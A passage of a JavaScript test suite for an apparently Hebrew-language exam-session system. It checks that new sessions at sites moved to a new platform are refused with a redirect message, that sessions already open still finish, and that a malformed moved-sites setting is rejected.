  assert.deepEqual(create(e), { status: 'error', code: 'site_moved', site: 'בסיס 6',
    message: 'האתר "בסיס 6" עבר למערכת החדשה — יש להשתמש בקישור החדש' });
  assert.equal(e.rows('סשנים').length, sessionsBefore, 'a refusal writes no session row');
  const guest = create(e, { site: 'בסיס 7', quotas: JSON.stringify([{ license: 'B', requested: 5, approved: 5 },
    { site: 'בסיס 9', license: 'B', requested: 3, approved: 3 }]) });
  assert.equal(guest.code, 'site_moved', 'a moved GUEST site is refused too (names compared trimmed, spaces collapsed)');
  assert.equal(guest.site, 'בסיס 9');
  e.properties.set('MOVED_SITES_URL', 'https://new.example.invalid/examiner');
  const withUrl = create(e);
  assert.equal(withUrl.url, 'https://new.example.invalid/examiner');
  assert.equal(withUrl.message, 'האתר "בסיס 6" עבר למערכת החדשה — יש להשתמש בקישור החדש: https://new.example.invalid/examiner');
  assert.equal(create(e, { site: 'בסיס 7' }).status, 'ok', 'every other site opens as before');
  assert.equal(health(e).movedSites, 2, 'health reports the count, never the names');

  // LIVE0001 is a session of 'בסיס 6' that was open before the move: it finishes normally.
  assert.equal(get(e, { action: 'getSessionInfo', sessionCode: 'LIVE0001' }).status, 'ok');
  assert.equal(get(e, { action: 'registerExaminee', sessionCode: 'LIVE0001', idNumber: idOf(9), fullName: 'נבחן', phone: '0500000009',
    license: 'B', language: 'he' }).status, 'ok');
  assert.equal(get(e, Object.assign({ action: 'examinerDashboard', origin: 'examiner-app', sessionCode: 'LIVE0001' }, PLAIN_EXAMINER)).status, 'ok');

  // A value that is not a JSON array of strings is refused loudly, never read as "nothing moved".
  for (const typo of ['בסיס 6, בסיס 9', '{"site":"בסיס 6"}', '[6]', '"בסיס 6"']) {
    e.properties.set('MOVED_SITES', typo);
    assert.equal(create(e, { site: 'בסיס 7' }).code, 'moved_sites_invalid', typo);
    assert.equal(health(e).movedSites, 'invalid', typo);
  }
  assert.equal(e.rows('סשנים').filter(r => r[3] === 'בסיס 6' && r[0] !== 'LIVE0001').length, 0, 'no new session of the moved site at any point');
});
